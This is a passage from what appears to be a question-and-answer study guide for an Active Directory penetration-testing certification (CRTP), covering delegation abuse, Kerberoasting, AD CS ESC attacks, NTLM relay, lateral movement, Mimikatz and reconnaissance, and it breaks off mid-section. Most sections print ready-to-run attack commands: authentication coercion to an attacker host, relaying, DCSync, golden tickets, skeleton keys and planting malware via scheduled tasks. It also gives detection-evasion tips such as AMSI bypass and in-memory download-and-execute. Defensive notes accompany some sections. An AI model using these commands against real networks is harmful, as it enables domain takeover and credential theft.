Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
```

**Vulnerability:**

If you compromise machine with unconstrained delegation:
- Wait for high-priv user to authenticate to it
- Their TGT now in memory
- Extract TGT
- Impersonate them anywhere in domain

**Attack steps:**

**Step 1: Find unconstrained delegation:**

```powershell
# PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname,operatingsystem
```

**Step 2: Compromise such a machine** (local admin sufficient)

**Step 3: Force authentication to your compromised host:**

Use Printer Bug (SpoolSample / PrintSpoofer):

```powershell
# SpoolSample (now SharpSpoolTrigger)
.\SpoolSample.exe TARGET_DC UNCONSTRAINED_HOST
```

This makes the DC authenticate to your compromised host, sending DC's TGT.

**Step 4: Capture TGT:**

```powershell
# Mimikatz
sekurlsa::tickets /export

# Or Rubeus
.\Rubeus.exe monitor /interval:1 /filteruser:DC_NAME$
```

**Step 5: Use TGT:**

```powershell
.\Rubeus.exe ptt /ticket:DC_TGT.kirbi

# Now DCSync as DC
mimikatz # lsadump::dcsync /user:krbtgt
```

**Defense:**

1. **Avoid unconstrained delegation** - use constrained instead

2. **Protected Users group** - members can't be delegated

3. **Sensitive accounts** - mark as "Account is sensitive and cannot be delegated"

4. **Audit existing delegations:**
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedForDelegation -eq $true}
```

5. **Remove from non-DC accounts** wherever possible

**Real exploitation example:**

In your CRTP-style scenario:
1. Compromise dev server (local admin)
2. Discover dev server has unconstrained delegation
3. SpoolSample to force DC$ to authenticate
4. Capture DC's TGT
5. DCSync as krbtgt
6. Create Golden Ticket
7. Domain compromise

### Q20: Constrained delegation - explain
**A:**

**Constrained delegation** = Service can impersonate users only to specific services.

**Two types:**

**1. Constrained Delegation (Old style - "TrustedToAuthForDelegation"):**

User → Service A → Service B (specifically configured)

```powershell
# Configured at Service A
Get-ADComputer ServiceA -Properties msDS-AllowedToDelegateTo

# Lists services A can delegate to
```

Only "S4U2Proxy" mechanism (no actual TGT forwarded).

**2. Resource-Based Constrained Delegation (RBCD - New style):**

Service B controls who can delegate TO it.

```powershell
# Configured at Service B
Get-ADComputer ServiceB -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

**Constrained delegation attacks:**

**Attack 1: Abuse misconfigured constrained delegation**

If Service A configured to delegate to "CIFS/server.corp.local":

```powershell
# As Service A, request ticket to CIFS service on server
.\Rubeus.exe s4u /user:ServiceA$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/server.corp.local /ptt
```

S4U2Self requests TGT for any user (with their PAC).
S4U2Proxy uses that to request TGS to specified service.

Result: TGS for CIFS as Administrator.

**Attack 2: Protocol Transition Abuse**

If user has "Use any authentication protocol":
- Can impersonate any user (even without their auth)
- More dangerous configuration

**RBCD attack:**

If you control a service and have GenericWrite on a target:

```powershell
# Create a computer account
$pwd = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-MachineAccount -MachineAccount "rbcd_attack$" -Password $pwd

# Set its credentials as allowed to delegate to target
Set-ADComputer TargetComputer -PrincipalsAllowedToDelegateToAccount rbcd_attack$

# Now use S4U to access target as any user
.\Rubeus.exe s4u /user:rbcd_attack$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TargetComputer /ptt
```

**Detection:**

- Unusual S4U requests
- Account modifications adding delegation
- New machine account creations
- ACL changes on msDS-AllowedToActOnBehalfOfOtherIdentity

**Defense:**

1. **Audit existing delegations**
2. **Protected Users group** for sensitive accounts
3. **Sensitive accounts** marked non-delegatable
4. **Restrict GenericWrite** on computer accounts
5. **Disable computer account creation** for regular users
   - Default: MachineAccountQuota = 10 per user
   - Change to 0:
   ```powershell
   Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
   ```

**For CRTP:**

RBCD common attack path. Watch for:
- Users with GenericWrite on computers
- High MachineAccountQuota (default 10)
- Misconfigured constrained delegation

### Q21: SPNs (Service Principal Names) - explained
**A:**

**SPN** = Identifier for a service in Kerberos.

**Format:**
```
serviceclass/hostname:port/servicename
```

Examples:
```
MSSQLSvc/sqlserver.corp.local:1433
HTTP/web.corp.local
CIFS/fileserver.corp.local
HOST/server.corp.local
LDAP/dc.corp.local
WSMAN/server.corp.local
```

**Why important:**

1. **Kerberos requires SPNs** - Clients request tickets using SPN
2. **One SPN per service instance** - Must be unique in domain
3. **Tied to service account** - SPN registered to user/computer running service

**Vulnerabilities:**

**1. Kerberoasting target identification:**

Users with SPNs can be Kerberoasted:
```powershell
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

**2. SPN scanning:**

Enumerate services in domain:
```powershell
# Tool: setspn
setspn -Q */* 

# PowerView
Get-DomainComputer -SPN MSSQLSvc/* | select dnshostname, serviceprincipalname
Get-DomainComputer -SPN HTTP/* | select dnshostname, serviceprincipalname
```

**3. SPN hijacking:**

If you can write to user's `servicePrincipalName` attribute:
- Add SPN
- Now user can be Kerberoasted
- If user has weak password = compromise

**4. Computer-to-user SPN move:**

Move SPN from computer account to user account → Kerberoast user account.

**Why some accounts have SPNs:**

- SQL Server runs as service account
- IIS application pool identity
- SharePoint farm account
- Exchange service accounts
- Custom service accounts

**Common SPN types:**

```
MSSQLSvc/      - SQL Server
HTTP/          - Web services (IIS, Apache)
HOST/          - General host services
CIFS/          - File shares
LDAP/          - Directory services
GC/            - Global Catalog
TERMSRV/       - Terminal services
WSMAN/         - WinRM
DNS/           - DNS service
MSExchangeRPC/ - Exchange
```

**Targeted Kerberoasting (your CRTP knowledge):**

If you have write access to user X's SPN attribute:

```powershell
# Add SPN
Set-DomainObject -Identity user_x -Set @{serviceprincipalname='nonexistent/spn'}

# Kerberoast
Get-DomainUser user_x | Get-DomainSPNTicket -Format Hashcat

# Remove SPN to avoid detection
Set-DomainObject -Identity user_x -Clear serviceprincipalname
```

Useful when you have GenericWrite on a user but can't reset their password.

### Q22: What is a forest trust vs domain trust?
**A:**

**Trust** = Authentication and authorization across security boundaries.

**Domain Trust:**

Between domains in same forest:
```
Forest A
├── parent.local
└── child.parent.local
```

Default: Two-way transitive trust between parent and child.

**Forest Trust:**

Between separate forests:
```
Forest A: contoso.com
Forest B: fabrikam.com
```

Trust must be explicitly created.

**Trust types:**

**1. Two-way trust:**
- A trusts B
- B trusts A
- Bidirectional

**2. One-way trust:**
- A trusts B (B users can access A resources)
- B doesn't trust A
- Outgoing trust from A perspective
- Incoming trust to B perspective

**3. Transitive:**
- If A trusts B and B trusts C, then A trusts C

**4. Non-transitive:**
- Only direct trust applies

**Common types:**

**External trust:**
- Between domains in different forests
- One-way or two-way
- Non-transitive
- Manual creation

**Forest trust:**
- Between forest roots
- Transitive within forest (extends to child domains)
- Cross-forest authentication

**Realm trust:**
- With non-Windows Kerberos realms (Unix/Linux)

**Shortcut trust:**
- Same forest, shortcut between domains
- Performance optimization

**Trust attacks (CRTP territory):**

**1. SID History abuse:**

Trust includes SID History. User in Forest A can have SID from Forest B:
- Effective access in both forests
- If misconfigured: Domain Admin in one = Admin in other

**2. Inter-forest authentication:**

Once trust established, users in trusted forest can:
- Authenticate to trusting forest
- Access resources granted via ACL
- Exploit vulnerabilities in trusting forest

**3. Trust ticket extraction:**

```powershell
# Mimikatz - get trust keys
lsadump::trust /patch
```

Extracted keys can be used for:
- Forging inter-realm tickets
- Cross-forest movement

**4. Foreign principals:**

Users from other forest as members in groups:
```powershell
Get-DomainGroupMember "Domain Admins" -Recurse | 
    Where-Object {$_.MemberDomain -ne $env:USERDNSDOMAIN}
```

**Defense:**

1. **Selective Authentication** - explicit per-user access
2. **SID Filtering** - block SID History attacks
3. **Trust auditing**
4. **Limit trust scope**
5. **Monitor cross-forest authentication**

**For CRTP exam:**

Trust attacks common in lab. Practice:
- Enumerating trusts
- Cross-domain Kerberoasting
- SID History injection
- Trust ticket creation

### Q23: ADCS (Certificate Services) and ESC attacks
**A:**

**ADCS (Active Directory Certificate Services)** = Microsoft PKI for issuing certificates.

**Certificate uses:**
- Authentication (smart cards, certificate-based auth)
- Encryption (S/MIME, BitLocker)
- Code signing
- Web HTTPS

**ESC attacks** = SpecterOps research on AD CS misconfigurations (ESC1 through ESC15+).

**ESC1: Misconfigured Certificate Templates**

If template allows:
- Domain Users to enroll
- User-supplied Subject (Subject Alternative Name)
- Client Authentication EKU

You can request certificate for any user:

```powershell
# Certify (or Certipy)
.\Certify.exe find /vulnerable

# Request cert as Administrator
.\Certify.exe request /ca:CA.corp.local\corp-CA-CA /template:VulnTemplate /altname:Administrator
```

Then use cert for authentication:
```powershell
# Rubeus
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:CertPass
```

**ESC2: Misconfigured Certificate Templates (Any Purpose)**

Template has "Any Purpose" EKU or no EKU = certificate can be used for anything including auth.

**ESC3: Enrollment Agent**

Enrollment agent certificates can request certs on behalf of others.

**ESC4: Vulnerable Certificate Template Access Control**

You have write access to certificate template object. Modify template to make it vulnerable.

**ESC5: Vulnerable PKI Object Access Control**

ACL issues on CA, PKI objects, etc.

**ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2**

CA flag set making CA accept SAN regardless of template.

**ESC7: Vulnerable Certificate Authority Access Control**

You have admin rights on CA. Modify settings.

**ESC8: NTLM Relay to AD CS HTTP Endpoints**

CA HTTP enrollment endpoints (Web Enrollment, NDES) vulnerable to NTLM relay.

```powershell
# Coercion via PetitPotam
.\PetitPotam.exe attacker_host victim

# Or PrinterBug
# Or DFSCoerce

# Relay
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support --adcs --template VulnerableTemplate
```

Result: Certificate as victim → authenticate as victim.

**ESC9-15+:** Various other misconfigurations (StrongCertificateBindingEnforcement issues, etc.)

**Why ESCs are critical:**

- Bypass NTLM/Kerberos complexity
- Certificate-based auth is "trusted"
- Often unmonitored
- Persistent (certs valid for years)

**Detection:**

- Certify/Certipy tools execution
- Unusual certificate requests
- Certificates issued to admin accounts
- HTTP relay attempts

**Defense:**

1. **Audit certificate templates** regularly:
```powershell
.\Certify.exe find
# Or
Certipy find -u user@corp.local -p password -dc-ip 10.10.10.10
```

2. **Disable EDITF_ATTRIBUTESUBJECTALTNAME2**

3. **Disable HTTP enrollment** if not needed

4. **Enable EPA (Extended Protection for Authentication)**

5. **Patch CVE-2022-26923** (Certifried)

6. **Monitor certificate issuance** to privileged accounts

7. **Tier 0 CA management** - CAs are Tier 0 assets

**For CRTP:**

ADCS attacks beyond CRTP scope but valuable to know. Often tested in CRTE/PACES.

### Q24: NTLM Relay attacks
**A:**

**NTLM Relay** = Intercept NTLM authentication, relay to another server to authenticate as victim.

**How NTLM auth works (recap):**

```
1. Client → Server: Authentication request
2. Server → Client: Challenge (random 8 bytes)
3. Client → Server: Response (HMAC of challenge with password hash)
4. Server validates
```

**Relay attack:**

```
1. Victim → Attacker (instead of server): Auth request
2. Attacker → Real Server: Auth request
3. Real Server → Attacker: Challenge
4. Attacker → Victim: Same challenge
5. Victim → Attacker: Response
6. Attacker → Real Server: Same response
7. Real Server → Attacker: Authenticated as Victim!
```

Now attacker authenticated as victim to real server.

**How to coerce victim authentication:**

**1. LLMNR/NBT-NS Poisoning:**

```bash
# Responder
sudo responder -I eth0
```

Victims looking up bad hostnames query LLMNR/NBT-NS. Responder claims to be that host. Victims authenticate.

**2. PetitPotam (CVE-2021-36942):**

Force DC to authenticate to attacker:
```bash
python3 PetitPotam.py attacker_host DC_IP
```

**3. PrinterBug (CVE-2021-34527 / "PrintNightmare"):**

```powershell
# SpoolSample
.\SpoolSample.exe DC_IP attacker_host
```

**4. WebDAV / DFS Coercion:**

Similar techniques.

**5. Email-based:**

Send HTML email with image from `\\attacker\share\image.png`. Victim's Outlook tries to authenticate.

**6. File-based:**

Drop file in shared location with malicious icon path: `\\attacker\share`

**Relay targets:**

**1. SMB (most common):**
```bash
ntlmrelayx.py -t smb://target -smb2support
```

If target requires SMB signing: relay fails. If signing not enforced: relay succeeds.

**2. LDAP/LDAPS:**
```bash
ntlmrelayx.py -t ldaps://dc.corp.local --delegate-access
```

Can add machine accounts, modify ACLs.

**3. HTTP/HTTPS (especially AD CS):**
```bash
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template TemplateName
```

**4. MSSQL:**
```bash
ntlmrelayx.py -t mssql://server -smb2support
```

**5. IMAP/SMTP:**
```bash
ntlmrelayx.py -t imap://exchange.corp.local
```

**6. WMI/DCOM:**

Newer relay targets.

**Defense:**

**1. Enforce SMB signing:**
- DC-level: Enabled by default
- Other systems: Often disabled
- GPO: "Microsoft network server: Digitally sign communications (always)"

**2. Disable NTLM where possible:**
- Use Kerberos
- "Network security: Restrict NTLM" policies

**3. Enable EPA (Extended Protection for Authentication):**
- For HTTP/HTTPS services
- Mitigates relay to web services

**4. LLMNR/NBT-NS disable:**
```
Group Policy:
- Computer Configuration → Policies → Admin Templates → Network → DNS Client
- "Turn off multicast name resolution" = Enabled
```

**5. SMB signing on file servers**

**6. Disable WebDAV WebClient service on workstations**

**7. Monitor for:**
- Multiple failed NTLM auth from same source
- NTLM auth to unusual destinations
- Coercion-related events

**For CRTP:**

NTLM relay essential. Often combined with coercion for domain compromise. Practice:
- Set up Responder
- Coerce authentication
- Relay to interesting targets
- Get cert via ADCS relay

### Q25: PowerView - essential cmdlets
**A:**

**PowerView** = PowerShell tool for AD enumeration (part of PowerSploit).

**Common cmdlets:**

**Domain enumeration:**
```powershell
# Current domain info
Get-Domain

# Domain controllers
Get-DomainController

# Domain SID
Get-DomainSID

# Domain trusts
Get-DomainTrust
Get-DomainTrustMapping
Get-ForestTrust

# Forest info
Get-Forest
Get-ForestDomain
```

**User enumeration:**
```powershell
# All users
Get-DomainUser

# Specific user
Get-DomainUser jagdeep

# Users with attribute
Get-DomainUser -SPN          # Has SPN (Kerberoastable)
Get-DomainUser -PreauthNotRequired  # ASREP-roastable
Get-DomainUser -Unconstrained  # Unconstrained delegation

# Property filtering
Get-DomainUser | Where-Object {$_.adminCount -eq 1}  # Privileged users
Get-DomainUser -LDAPFilter "(servicePrincipalName=*)"

# Specific properties
Get-DomainUser | select samaccountname, description, memberof
```

**Group enumeration:**
```powershell
# All groups
Get-DomainGroup

# Group members
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Domain Admins" -Recurse

# What groups is user in
Get-DomainGroup -UserName jagdeep
```

**Computer enumeration:**
```powershell
# All computers
Get-DomainComputer

# Servers only
Get-DomainComputer -OperatingSystem "*Server*"

# Domain controllers
Get-DomainController

# Find by OS
Get-DomainComputer | Where-Object {$_.operatingsystem -like "*2003*"}  # Legacy systems
```

**ACL enumeration:**
```powershell
# Find objects with interesting ACLs
Get-DomainObjectAcl -Identity "Domain Admins"

# ACLs on object
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs

# Find what current user can do
Find-InterestingDomainAcl -ResolveGUIDs

# Filter by your account
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq $env:USERNAME}
```

**GPO enumeration:**
```powershell
Get-DomainGPO

# What GPOs apply to OU
Get-DomainGPO -Identity "Sales"

# Computer's effective GPOs
Get-DomainGPO -ComputerName "PC1"
```

**Session enumeration:**
```powershell
# Where users logged in
Get-NetSession -ComputerName "FILESERVER"

# Get domain sessions
Find-DomainUserLocation -UserName "Administrator"
```

**Delegation enumeration:**
```powershell
# Unconstrained
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained

# Constrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

**Local admin enumeration:**
```powershell
# Local admins on specific computer
Get-NetLocalGroupMember -ComputerName "PC1" -GroupName "Administrators"

# Where am I local admin?
Find-LocalAdminAccess
```

**OPSEC considerations:**

PowerView is detected by EDR/AV:
- Use obfuscation (Invoke-Obfuscation)
- Load in memory: `IEX (New-Object Net.WebClient).DownloadString('http://...')`
- AMSI bypass first
- Use PowerShell v2 (no AMSI)

**Tools alternative:**

- **AD Module (Microsoft):** Less detected but limited
- **BloodHound (SharpHound):** C# binary, customizable
- **adidnsdump:** DNS enumeration
- **Impacket suite:** Linux-based AD enumeration

### Q26: What is SYSVOL and what's in it?
**A:**

**SYSVOL** = Shared folder on every DC containing public AD information.

**Location:**
```
\\corp.local\SYSVOL\corp.local\
```

Replicated across all DCs in domain.

**Contents:**

```
SYSVOL\corp.local\
├── Policies\
│   └── {GUID}\    (Group Policy Objects)
│       ├── Machine\
│       │   ├── Registry.pol
│       │   ├── Scripts\
│       │   │   ├── Startup\
│       │   │   └── Shutdown\
│       │   └── Preferences\
│       │       └── Groups\
│       │           └── Groups.xml  ← Watch for cPassword!
│       └── User\
│           └── Scripts\
│               ├── Logon\
│               └── Logoff\
├── scripts\       (Custom scripts/login)
├── PolicyDefinitions\  (ADMX/ADML files)
└── DfsrPrivate\
```

**Why interesting:**

**1. Anyone can read** - Authenticated Users have read access by default

**2. Contains policies** - GPOs define security, can reveal settings

**3. Scripts may have credentials** - Logon scripts often hardcoded

**4. Group Policy Preferences (GPP) historical issue** - Encrypted passwords

**5. Software deployment configs** - May contain creds

**6. Misconfigurations visible** - Reveals attack opportunities

**Common findings:**

**1. GPP cPassword:**

Pre-MS14-025 GPOs stored passwords in Groups.xml:
```xml

  

```

The `cpassword` is AES-256 encrypted with a PUBLIC key (Microsoft KB).

Decryption:
```powershell
# PowerView
Get-GPPPassword

# Or
Get-CachedGPPPassword
```

Even though MS14-025 patched the issue, old GPP files often left in SYSVOL.

**2. Scripts with credentials:**

```batch
REM From SYSVOL\domain\scripts\login.bat
net use Z: \\server\share /user:domain\admin Password123
```

```powershell
# Search for password patterns
Get-ChildItem -Path \\corp.local\SYSVOL -Include *.bat,*.ps1,*.vbs,*.cmd -Recurse | 
    Select-String -Pattern "password|cred|user"
```

**3. Software install scripts:**

May contain service account credentials.

**4. SCCM/Configuration:**

Configuration baselines may reveal info.

**Enumeration:**

```powershell
# Direct browse
explorer.exe \\corp.local\SYSVOL\

# Search all files
Get-ChildItem -Path \\corp.local\SYSVOL -Recurse -File | Select-Object FullName

# Search for sensitive patterns
Get-ChildItem -Path \\corp.local\SYSVOL -Recurse | 
    Select-String -Pattern "password|credential|api[-_]?key"

# Check Groups.xml specifically
Get-ChildItem -Path \\corp.local\SYSVOL -Filter Groups.xml -Recurse
```

**For CRTP:**

SYSVOL enumeration is early-game essential. Always check:
1. cPassword in old GPP
2. Scripts with credentials
3. Configuration files
4. Backup files left behind

Quick wins often found here.

### Q27: Lateral movement techniques in AD
**A:**

**Lateral movement** = Moving from compromised host to other hosts.

**Common techniques:**

**1. PsExec (SMB):**
```bash
# Impacket
psexec.py corp.local/admin:Password@target.corp.local

# With hash
psexec.py -hashes :NTHASH corp.local/admin@target

# Original Sysinternals
PsExec.exe \\target -u admin -p password cmd.exe
```

**2. WMIC / wmiexec:**
```bash
# Impacket
wmiexec.py corp.local/admin:Password@target.corp.local

# Native
wmic /node:target.corp.local process call create "cmd.exe /c calc.exe"
```

**3. WinRM (PowerShell Remoting):**
```powershell
# Native
Enter-PSSession -ComputerName target.corp.local -Credential domain\admin

# With password
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "domain\admin", (ConvertTo-SecureString "Password" -AsPlainText -Force)
Enter-PSSession -ComputerName target -Credential $cred

# Invoke command
Invoke-Command -ComputerName target -ScriptBlock {whoami}
```

**4. SMB shares (file copy + scheduled task):**
```bash
# Copy file
copy malware.exe \\target.corp.local\C$\Windows\Temp\

# Create scheduled task to run
schtasks /create /s target.corp.local /tn "Update" /tr "C:\Windows\Temp\malware.exe" /sc onstart /ru SYSTEM
schtasks /run /s target.corp.local /tn "Update"
```

**5. RDP:**
```bash
# xfreerdp (Linux)
xfreerdp /u:admin /p:Password /v:target.corp.local

# With hash
xfreerdp /u:admin /pth:HASH /v:target.corp.local /cert-ignore

# Native
mstsc /v:target
```

**6. DCOM (Distributed COM):**

Various COM objects can execute code remotely:
- MMC20.Application
- ShellWindows
- ShellBrowserWindow

```powershell
# Impacket
dcomexec.py corp.local/admin:Password@target

# Manual PowerShell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "target.corp.local"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")
```

**7. Pass-the-Hash (already covered):**

Using NTLM hash without password.

**8. Pass-the-Ticket (already covered):**

Using Kerberos tickets.

**9. Token impersonation:**

If you have SeImpersonatePrivilege:
- Impersonate other users' tokens
- Print Spoofer / Juicy Potato

```powershell
# PrintSpoofer
.\PrintSpoofer.exe -i -c "cmd"
```

**10. Service hijacking:**

Modify service binary path or DLL:
```cmd
sc config service_name binpath= "cmd.exe /c whoami > C:\out.txt"
sc start service_name
```

**Detection-aware techniques:**

**Stealth considerations:**

- **WinRM** is logged less than PsExec
- **WMI** less noisy than SMB shells
- **Scheduled tasks** look legitimate
- **RDP** common, less suspicious

**Heavy detection:**

- PsExec creates service (Event 7045)
- SMB shares with admin authentication
- Scheduled task creation

**For CRTP:**

Master multiple techniques. Sometimes EDR blocks one but allows another. Practice all:
- PsExec for quick wins
- WMI for stealth
- WinRM for PowerShell
- Token theft for local escalation

### Q28: Mimikatz - core commands
**A:**

**Mimikatz** = Premier credential dumping tool (by Benjamin Delpy).

**Get debug privileges first:**
```
mimikatz # privilege::debug
Privilege '20' OK
```

**Core modules:**

**1. sekurlsa (LSASS):**

```
# Dump all credentials
sekurlsa::logonpasswords

# Output includes:
# - Username
# - Domain  
# - LM, NTLM, SHA1 hashes
# - Plaintext password (sometimes - WDigest)
# - Kerberos tickets

# Specific user
sekurlsa::credman

# Just Kerberos tickets
sekurlsa::tickets /export

# Pass-the-hash (open new process)
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe
```

**2. kerberos:**

```
# List current tickets
kerberos::list

# Purge tickets
kerberos::purge

# Pass-the-ticket
kerberos::ptt ticket.kirbi

# Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-... /krbtgt:HASH /ticket:golden.kirbi

# Silver Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-... /target:server.corp.local /service:CIFS /rc4:SERVICE_HASH /ticket:silver.kirbi
```

**3. lsadump:**

```
# DCSync (need DA or replication privs)
lsadump::dcsync /user:Administrator /domain:corp.local
lsadump::dcsync /user:krbtgt /domain:corp.local

# SAM (need SYSTEM)
lsadump::sam

# LSA secrets (need SYSTEM)
lsadump::secrets

# Trust keys
lsadump::trust /patch

# Cached credentials
lsadump::cache
```

**4. token:**

```
# List tokens
token::list

# Elevate to SYSTEM
token::elevate

# Impersonate specific user
token::list /user:Administrator
token::elevate /user:Administrator
```

**5. crypto:**

```
# Certificate manipulation
crypto::certificates /export /systemstore:LOCAL_MACHINE

# Export private keys (need admin)
crypto::keys /export
```

**6. misc:**

```
# Skeleton Key (master password)
misc::skeleton

# After this, any user can authenticate to DC with "mimikatz" password
```

**Recent advanced techniques:**

**1. Diamond Ticket:**

Like Golden but modifies legitimate TGT (more stealthy):
```
kerberos::diamond /user:Administrator /domain:corp.local /sid:S-... /krbtgt:HASH /tgt:legit.kirbi
```

**2. Sapphire Ticket:**

Even stealthier variant.

**Detection:**

- Mimikatz file signatures (AV catches old versions)
- LSASS access events
- WDigest enabled (provides plaintext)
- Specific command patterns

**Evasion:**

- Use SharpKatz (C# version)
- Use Cobalt Strike's `mimikatz` command (in-memory)
- Custom build to evade signatures
- Use direct syscalls

**Defense:**

1. **Credential Guard** - virtualization-based protection
2. **Restricted Admin mode** - prevents some cred theft
3. **Protected Process Light** for LSASS
4. **Disable WDigest** (no plaintext caching)
5. **Monitor LSASS access** (sysmon)
6. **Tier 0 isolation**

**For CRTP:**

Mimikatz is essential. Know all major commands. Practice:
- Logon password extraction
- Ticket dumping and PtT
- DCSync
- Golden/Silver ticket creation

### Q29: AD reconnaissance from low-privilege user
**A:**

**As any domain user, what you can enumerate:**

**Built-in Windows tools:**

```cmd
# Current context
whoami
whoami /all
whoami /groups
whoami /priv

# Domain info
nltest /dclist:corp.local
nltest /domain_trusts

# Users in group
net user /domain
net user "specific_user" /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Computers
net view /domain
net view /domain:corp.local

# Local stuff
net localgroup
net localgroup Administrators
```

**PowerShell built-in:**

```powershell
# AD Module (if installed)
Get-ADUser -Filter *
Get-ADGroup -Filter *
Get-ADComputer -Filter *

# .NET reflection (no module needed)
$DC = [ADSI]"LDAP://DC=corp,DC=local"
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = $DC
$searcher.Filter = "(objectCategory=user)"
$searcher.FindAll() | ForEach-Object {$_.Properties.samaccountname}
```

**PowerView (advanced):**

```powershell
# Comprehensive recon
Get-Domain
Get-DomainController
Get-DomainSID
Get-DomainPolicy
Get-DomainUser
Get-DomainGroup
Get-DomainComputer

# Find sensitive groups
Get-DomainGroupMember "Domain Admins" -Recurse
Get-DomainGroupMember "Enterprise Admins" -Recurse
Get-DomainGroupMember "Schema Admins" -Recurse

# Find high-value targets
Get-DomainUser | Where-Object {$_.adminCount -eq 1}

# Trusts
Get-DomainTrust
Get-ForestTrust
Get-DomainTrustMapping

# Delegations
Get-DomainComputer -Unconstrained
Get-DomainUser -Unconstrained
Get-DomainUser -TrustedToAuth

# GPOs
Get-DomainGPO
Get-DomainGPOLocalGroup

# SPNs (Kerberoastable)
Get-DomainUser -SPN
```

**LDAP queries (powerful):**

```powershell
# Direct LDAP queries
ldapsearch -x -h dc.corp.local -D "user@corp.local" -w password -b "DC=corp,DC=local" "(objectClass=user)"

# Specific filters
"(servicePrincipalName=*)"           # SPN users (Kerberoastable)
"(userAccountControl:1.2.840.113556.1.4.803:=4194304)"  # ASREP-roastable
"(userAccountControl:1.2.840.113556.1.4.803:=524288)"   # Unconstrained delegation
"(msDS-AllowedToDelegateTo=*)"       # Constrained delegation
"(adminCount=1)"                     # Privileged users
```

**BloodHound (graphical):**

```powershell
# Run SharpHound
.\SharpHound.exe -CollectionMethod All
```

Import to BloodHound for visualization.

**Files to look at:**

**1. SYSVOL:**
```cmd
dir \\corp.local\SYSVOL\corp.local\
```

**2. Shares:**
```cmd
net view \\target /all

# Or
crackmapexec smb 10.10.10.0/24 --shares
```

**3. Sensitive folders:**
- Profile folders
- Public shares
- Software deployment locations

**Quiet recon (avoid detection):**

**LDAP queries** instead of net commands (less logged).

**Read-only operations** only (no creates, modifies).

**Spread queries over time** rather than burst.

**Use legitimate tools** (AD module, PowerShell built-ins).

**Avoid AMSI** triggering:
- AMSI bypass first
- Or use older PowerShell
- Or use ADSI directly

**For CRTP:**

First hours of exam should be all enumeration. Build complete map:
- Users
- Groups
- Computers
- ACLs
- Trusts
- Delegations
- High-value targets

Then plan exploitation.

### Q30: Common AD misconfigurations to look for
**A:**

**Top misconfigurations:**

**1. Default admin accounts not renamed:**
- Administrator account easy to target
- Should be renamed (security through obscurity is OK as defense layer)

**2. Domain Admins logged in everywhere:**
- DA shouldn't login to workstations or servers
- Should use PAW (Privileged Access Workstation)
- Each DA login on lower-tier system = potential compromise

**3. Old Windows versions:**
- 2003, 2008 servers still around
- Many vulnerabilities
- Easy initial access

**4. Service accounts as DA:**
- Service accounts often have DA rights "for convenience"
- Kerberoast → password crack → DA

**5. No LAPS:**
- Local admin password same across machines
- Compromise one = compromise all

**6. Unconstrained delegation everywhere:**
- Often configured for legacy reasons
- Each = potential compromise vector

**7. ACL misconfigurations:**
- "Authenticated Users" with too much access
- Helpdesk groups with DCSync rights
- WriteDACL on Domain Admins

**8. KRBTGT password never rotated:**
- Default = compromised forever once leaked
- Should be rotated periodically (and twice when suspected breach)

**9. SMB signing disabled:**
- Enables NTLM relay attacks
- Workstations often don't have it

**10. LLMNR/NBT-NS enabled:**
- Allows poisoning
- Easy hash capture
- Should be disabled

**11. Old GPP passwords in SYSVOL:**
- cPassword decryptable
- Easy credential discovery

**12. Default printer service enabled:**
- PrintNightmare, SpoolSample exploitation
- Should be disabled or patched

**13. AD CS with vulnerable templates:**
- ESC1-15 attacks possible
- Templates often misconfigured

**14. WSUS over HTTP:**
- Allows malicious update injection
- Should be HTTPS

**15. Anonymous LDAP queries:**
- Pre-Windows 2000 compatibility
- Reveals AD info to anyone

**16. Password policy weak:**
- 8 character minimum
- No complexity required
- Brute force feasible

**17. Inactive accounts:**
- Old accounts never disabled
- Service accounts forgotten
- Often have weak passwords

**18. Excessive admin group membership:**
- "Domain Admins" with too many users
- Each member = potential compromise

**19. No MFA on privileged accounts:**
- DA, EA without MFA
- Compromise = direct admin access

**20. Tier mixing:**
- DA accounts used for tier 1 and 2 tasks
- Cross-tier credential exposure

**Audit tools:**

- **PingCastle** - AD security audit
- **BloodHound** - Attack path analysis
- **ADRecon** - Comprehensive recon
- **Purple Knight** - Free AD assessment
- **SharpHound** - BloodHound collector
- **ADAudit Plus** - Commercial tool

**For your CRTP and bug bounty work:**

These misconfigs = your initial access and lateral movement opportunities. Methodically check each in lab environment.

---

## SECTION B: ATTACK TECHNIQUES (Q31-65)

### Q31: Complete attack chain from no access to Domain Admin
**A:**

**Realistic CRTP-style attack chain:**

**Phase 1: External recon (before access)**

If externally-facing:
- Subdomain enumeration
- Email gathering (theHarvester, Hunter.io)
- Password spray with common passwords
- OSINT for employees, technology stack

**Phase 2: Initial access**

Options:
- Phishing → user clicks → reverse shell
- Password spray success (Spring2024!)
- Public-facing vulnerability (RCE)
- Physical access (USB drop)

Result: Low-priv user on workstation

**Phase 3: Local privilege escalation**

Move from user to local admin:
- Unquoted service paths
- DLL hijacking
- Token impersonation (SeImpersonatePrivilege)
- Kernel exploits

```powershell
# Privilege check
whoami /priv

